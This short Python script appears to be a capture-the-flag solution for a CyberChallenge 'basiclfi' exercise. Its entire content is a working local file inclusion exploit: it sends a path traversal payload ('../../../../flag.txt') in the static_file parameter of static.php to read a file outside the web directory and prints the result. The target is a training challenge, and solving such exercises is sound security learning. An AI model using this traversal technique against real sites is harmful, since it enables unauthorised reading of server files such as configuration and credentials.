import requests

url = 'http://basiclfi.challs.cyberchallenge.it'
params = {
        'static_file' : '../../../../flag.txt'
    }
resp = requests.get(url + '/static.php', params=params)
print(resp.text)
